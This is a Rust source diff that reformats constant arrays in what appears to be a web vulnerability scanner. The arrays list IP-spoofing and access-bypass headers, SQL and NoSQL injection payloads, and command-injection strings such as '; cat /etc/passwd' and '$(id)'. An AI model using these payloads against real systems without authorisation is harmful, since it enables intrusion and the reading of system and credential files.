@@ -21,26 +21,56 @@ pub(super) const CHROME_USER_AGENTS: &[&str] = &[
 ];
 
 pub(super) const SPOOF_HEADERS: &[&str] = &[
-    "X-Forwarded-For", "X-Forwarded-Host", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
-    "X-Host", "X-Originating-IP", "Client-IP", "True-Client-IP", "Cluster-Client-IP",
-    "X-ProxyUser-Ip", "Via", "X-Real-IP", "Forwarded", "X-Custom-IP-Authorization",
-    "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Forwarded-Port",
+    "X-Forwarded-For",
+    "X-Forwarded-Host",
+    "X-Client-IP",
+    "X-Remote-IP",
+    "X-Remote-Addr",
+    "X-Host",
+    "X-Originating-IP",
+    "Client-IP",
+    "True-Client-IP",
+    "Cluster-Client-IP",
+    "X-ProxyUser-Ip",
+    "Via",
+    "X-Real-IP",
+    "Forwarded",
+    "X-Custom-IP-Authorization",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "X-Forwarded-Scheme",
+    "X-Forwarded-Proto",
+    "X-Forwarded-Port",
 ];
 
 pub(super) const SQLI_PAYLOADS: &[&str] = &[
-    "'", "\"", "OR 1=1", "' OR '1'='1", "\" OR \"1\"=\"1",
-    "1' ORDER BY 1--+", "1' UNION SELECT 1,2,3--+",
-    "admin' --", "admin' #", "' OR 1=1--",
+    "'",
+    "\"",
+    "OR 1=1",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "1' ORDER BY 1--+",
+    "1' UNION SELECT 1,2,3--+",
+    "admin' --",
+    "admin' #",
+    "' OR 1=1--",
 ];
 
 pub(super) const NOSQLI_PAYLOADS: &[&str] = &[
-    "{$ne: null}", "{$gt: \"\"}", "{$where: \"return true\"}",
-    "|| return true;", "'; return true; var foo='",
+    "{$ne: null}",
+    "{$gt: \"\"}",
+    "{$where: \"return true\"}",
+    "|| return true;",
+    "'; return true; var foo='",
 ];
 
 pub(super) const CMDI_PAYLOADS: &[&str] = &[
-    "; id", "| id", "`id`", "$(id)",
-    "; cat /etc/passwd", "| cat /etc/passwd",
+    "; id",
+    "| id",
+    "`id`",
+    "$(id)",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
     "& ping -c 1 127.0.0.1",
 ];
 
